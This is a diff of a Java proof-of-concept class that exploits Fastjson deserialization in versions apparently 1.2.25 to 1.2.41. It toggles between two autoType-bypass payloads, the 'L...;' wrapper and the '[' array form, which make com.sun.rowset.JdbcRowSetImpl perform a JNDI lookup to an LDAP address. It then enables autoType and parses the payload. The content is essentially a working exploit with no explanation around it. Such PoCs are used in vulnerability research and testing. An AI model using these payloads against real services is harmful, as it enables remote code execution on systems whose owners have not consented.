@@ -11,8 +11,8 @@ import com.alibaba.fastjson.parser.ParserConfig;
  */
 public class poc25to41JNI {
     public static void main(String[] args) {
-//        String str = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
-        String str = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
+        String str = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
+//        String str = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false}";
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         JSON.parseObject(str);
     }
